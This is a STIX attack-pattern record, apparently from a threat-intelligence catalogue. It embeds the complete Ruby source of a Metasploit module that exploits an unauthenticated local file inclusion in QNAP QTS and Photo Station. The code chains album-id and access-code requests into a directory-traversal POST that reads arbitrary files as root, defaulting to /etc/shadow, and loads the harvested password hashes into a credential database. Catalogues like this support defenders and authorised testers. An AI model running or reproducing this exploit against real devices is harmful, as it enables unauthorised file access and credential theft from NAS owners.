{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45ab19aa-9925-4188-8395-9c2f115512db",
    "created": "2024-08-14T16:32:43.556484Z",
    "modified": "2024-08-14T16:32:43.556488Z",
    "name": "QNAP QTS and Photo Station Local File Inclusion",
    "description": " This module exploits a local file inclusion in QNAP QTS and Photo Station that allows an unauthenticated attacker to download files from the QNAP filesystem.  Because the HTTP server runs as root, it is possible to access sensitive files, such as SSH private keys and password hashes.  This module has been tested on QTS 4.3.3 (unknown Photo Station version) and QTS 4.3.6 with Photo Station 5.7.9. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/qnap_lfi.rb",
            "external_id": "qnap_lfi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-7192"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-7194"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-7195"
        },
        {
            "source_name": "reference",
            "url": "https://infosecwriteups.com/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05"
        },
        {
            "source_name": "reference",
            "url": "https://www.qnap.com/en-us/security-advisory/nas-201911-25"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Imanfeng/QNAP-NAS-RCE"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'QNAP QTS and Photo Station Local File Inclusion',\n        'Description' => %q{\n          This module exploits a local file inclusion in QNAP QTS and Photo\n          Station that allows an unauthenticated attacker to download files from\n          the QNAP filesystem.\n\n          Because the HTTP server runs as root, it is possible to access\n          sensitive files, such as SSH private keys and password hashes.\n\n          This module has been tested on QTS 4.3.3 (unknown Photo Station\n          version) and QTS 4.3.6 with Photo Station 5.7.9.\n        },\n        'Author' => [\n          'Henry Huang', # Vulnerability discovery\n          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2019-7192'],\n          ['CVE', '2019-7194'],\n          ['CVE', '2019-7195'],\n          ['EDB', '48531'],\n          ['URL', 'https://infosecwriteups.com/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05'],\n          ['URL', 'https://www.qnap.com/en-us/security-advisory/nas-201911-25'],\n          ['URL', 'https://github.com/Imanfeng/QNAP-NAS-RCE']\n        ],\n        'DisclosureDate' => '2019-11-25', # Vendor advisory\n        'Actions' => [\n          ['Download', { 'Description' => 'Download the file at FILEPATH' }]\n        ],\n        'DefaultAction' => 'Download',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8080),\n      OptString.new('TARGETURI', [true, 'The URI of the QNAP Website', '/']),\n      OptString.new('FILEPATH', [true, 'The file to read on the target', '/etc/shadow']),\n      OptBool.new('PRINT', [true, 'Whether or not to print the content of the file', true]),\n      OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 3])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'authLogin.cgi')\n    )\n\n    unless res && res.code == 200 && (xml = res.get_xml_document)\n      return Exploit::CheckCode::Safe\n    end\n\n    info = %w[modelName version build patch].map do |node|\n      xml.at(\"//#{node}\").text\n    end\n\n    vprint_status(\"QNAP #{info[0]} #{info[1..].join('-')} detected\")\n\n    return Exploit::CheckCode::Appears if info[2].to_i < 20191206\n\n    Exploit::CheckCode::Detected\n  end\n\n  def run\n    if check == Exploit::CheckCode::Safe\n      print_error('Device does not appear to be a QNAP')\n      return\n    end\n\n    file_content = exploit_lfi(datastore['FILEPATH'])\n\n    if file_content.nil? || file_content.empty?\n      print_bad('Failed to perform Local File Inclusion')\n      return\n    end\n\n    fname = File.basename(datastore['FILEPATH'])\n\n    path = store_loot(\n      'qnap.http',\n      'text/plain',\n      datastore['RHOST'],\n      file_content,\n      fname\n    )\n\n    print_good(\"File download successful, saved in #{path}\")\n\n    print_good(\"File content:\\n#{file_content}\") if datastore['PRINT']\n\n    return unless datastore['FILEPATH'] == '/etc/shadow'\n\n    print_status('adding the /etc/shadow entries to the database')\n\n    file_content.lines.each do |line|\n      entries = line.split(':')\n\n      next if entries[1] == '*' || entries[1] == '!' || entries[1] == '!!'\n\n      credential_data = {\n        module_fullname: fullname,\n        workspace_id: myworkspace_id,\n        username: entries[0],\n        private_data: entries[1],\n        jtr_format: 'md5crypt',\n        private_type: :nonreplayable_hash,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n\n      create_credential(credential_data)\n    end\n  end\n\n  def exploit_lfi(file_path)\n    album_id, cookies = retrieve_album_id\n\n    unless album_id\n      print_bad('Failed to retrieve the Album Id')\n      return\n    end\n\n    print_good(\"Got Album Id : #{album_id}\")\n\n    access_code = retrieve_access_code(album_id, cookies)\n\n    unless access_code\n      print_bad('Failed to retrieve the Access Code')\n      return\n    end\n\n    print_good(\"Got Access Code : #{access_code}\")\n\n    print_status('Attempting Local File Inclusion')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'video.php'),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'vars_post' => {\n        'album' => album_id,\n        'a' => 'caption',\n        'ac' => access_code,\n        'filename' => \".#{file_path.start_with?('/') ? '/..' * datastore['DEPTH'] + file_path : \"/#{file_path}\"}\"\n      }\n    })\n\n    return unless res && res.code == 200\n\n    res.body\n  end\n\n  def retrieve_album_id\n    print_status('Getting the Album Id')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'album.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        'a' => 'setSlideshow',\n        'f' => 'qsamplealbum'\n      }\n    })\n\n    return unless res && res.code == 200\n\n    xml_data = res.get_xml_document\n    output = xml_data.xpath('//output[1]')\n    return if output.empty?\n\n    [output.inner_text, res.get_cookies]\n  end\n\n  def retrieve_access_code(album_id, cookies)\n    print_status('Getting the Access Code')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'photo', 'slideshow.php'),\n      'vars_get' => { 'album' => album_id },\n      'cookie' => cookies\n    })\n\n    return unless res && res.code == 200\n\n    res.body[/(?<=encodeURIComponent\\([\"']).+(?=['\"])/]\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-11-25, # Vendor advisory"
}